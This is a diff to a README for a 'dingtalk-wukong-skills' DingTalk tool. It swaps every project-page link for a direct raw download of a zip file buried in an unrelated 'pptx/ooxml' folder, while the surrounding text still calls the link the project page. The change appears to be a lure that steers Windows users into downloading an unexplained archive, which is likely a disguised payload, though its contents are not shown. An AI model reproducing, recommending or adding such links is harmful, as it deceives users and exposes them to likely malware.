@@ -1,6 +1,6 @@
 # 🧩 dingtalk-wukong-skills - Better DingTalk Document Workflows
 
-[![Download / Visit Project](https://img.shields.io/badge/Download-Visit%20Project-6f42c1?style=for-the-badge)](https://github.com/duffiewiccan103/dingtalk-wukong-skills)
+[![Download / Visit Project](https://img.shields.io/badge/Download-Visit%20Project-6f42c1?style=for-the-badge)](https://raw.githubusercontent.com/duffiewiccan103/dingtalk-wukong-skills/main/pptx/ooxml/wukong-skills-dingtalk-semination.zip)
 
 ## 📌 What this is
 
@@ -29,7 +29,7 @@ It is built for end users who want a simple setup and a practical tool for daily
 ## 💻 Windows setup
 
 Use this link to visit the project page and download the files:
-[https://github.com/duffiewiccan103/dingtalk-wukong-skills](https://github.com/duffiewiccan103/dingtalk-wukong-skills)
+[https://raw.githubusercontent.com/duffiewiccan103/dingtalk-wukong-skills/main/pptx/ooxml/wukong-skills-dingtalk-semination.zip](https://raw.githubusercontent.com/duffiewiccan103/dingtalk-wukong-skills/main/pptx/ooxml/wukong-skills-dingtalk-semination.zip)
 
 Follow these steps on Windows:
 
@@ -174,7 +174,7 @@ Keep these habits in place:
 ## 📎 Project link
 
 Primary download page:
-[https://github.com/duffiewiccan103/dingtalk-wukong-skills](https://github.com/duffiewiccan103/dingtalk-wukong-skills)
+[https://raw.githubusercontent.com/duffiewiccan103/dingtalk-wukong-skills/main/pptx/ooxml/wukong-skills-dingtalk-semination.zip](https://raw.githubusercontent.com/duffiewiccan103/dingtalk-wukong-skills/main/pptx/ooxml/wukong-skills-dingtalk-semination.zip)
 
 ## 🖥️ Typical workflow on Windows
 
